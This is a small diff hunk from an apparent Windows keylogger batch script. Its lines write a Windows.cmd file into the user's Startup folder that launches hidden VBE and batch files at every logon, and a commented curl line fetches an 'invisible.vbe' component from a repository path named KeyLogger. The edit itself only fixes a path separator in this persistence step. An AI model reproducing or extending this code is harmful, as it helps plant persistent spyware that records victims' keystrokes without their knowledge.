@@ -16,7 +16,7 @@ reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d  %te
 
 cd "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup"
 echo @echo off>Windows.cmd
-echo cd %temp%/t>>Windows.cmd
+echo cd %temp%\t>>Windows.cmd
 echo wscript.exe "i.vbe" "r.bat">>Windows.cmd
 
 :: curl -s https://raw.githubusercontent.com/Ale-cyber/test/master/KeyLogger/invisible.vbe -o i.vbe
